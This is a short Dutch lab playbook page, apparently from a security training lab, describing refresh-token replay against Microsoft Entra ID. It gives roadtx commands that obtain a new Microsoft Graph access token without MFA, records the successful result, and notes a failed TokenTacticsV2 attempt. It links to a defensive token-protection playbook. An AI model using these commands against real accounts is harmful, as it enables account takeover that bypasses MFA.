---
title: "PB-04 Refresh-token replay"
nav_order: 4
parent: "Playbooks"
---

# PB-04 Refresh-token replay

| | |
|---|---|
| **Pad** | B |
| **Doel** | Een refresh-token hergebruiken voor een nieuw access-token zonder MFA |
| **Tooling** | roadtx |
| **Waar** | Attacker Windows |
| **Status** | Getest — geslaagd |
| **Verdediging** | [PB-05]({{ '/playbooks/pb-05-token-protection/' | relative_url }}) |

**Startcondities.** Attacker Windows-VM; geen verdedigingspolicies actief. Datum: 12/11/2026.

```
roadtx gettokens -u 28_tu_token@aplab.be -p '<wachtwoord>' -r msgraph
roadtx refreshtokento -r msgraph
```

**Resultaat.** "Tokens were written to .roadtools_auth": een nieuw access-token voor `https://graph.microsoft.com/`, zonder MFA.

**Wat niet lukte.** `Invoke-RefreshToMSGraphToken` van TokenTacticsV2 gaf `AADSTS70000: Provided grant is invalid or malformed`. roadtx bewaart het refresh-token in een eigen formaat dat TokenTacticsV2 niet aanvaardt. Het subcommando `refreshtokento` van roadtx zelf werkt wel.
